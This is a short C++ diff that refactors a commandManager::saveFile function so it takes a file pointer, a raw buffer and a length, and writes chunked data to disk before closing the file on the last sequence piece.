@@ -208,16 +208,16 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
 
 }
 
-void commandManager::saveFile(std::string& path, std::string& data, DWORD seq) {
-    if (!this->fp) {
-        fopen_s(&this->fp, path.c_str(), "wb+");
+void commandManager::saveFile(FILE* &fp, std::string& path, LPVOID data, DWORD seq, DWORD len) {
+    if (!fp) {
+        fopen_s(&fp, path.c_str(), "wb+");
     }
 
-    fwrite(data.c_str(), 1, data.length(), this->fp);
+    fwrite(data, 1, len, fp);
 
     if (seq == NOT_SPLITED_SEQ || seq == LAST_SPLITED_SEQ) {
-        fclose(this->fp);
-        this->fp = NULL;
+        fclose(fp);
+        fp = NULL;
     }
        
 }
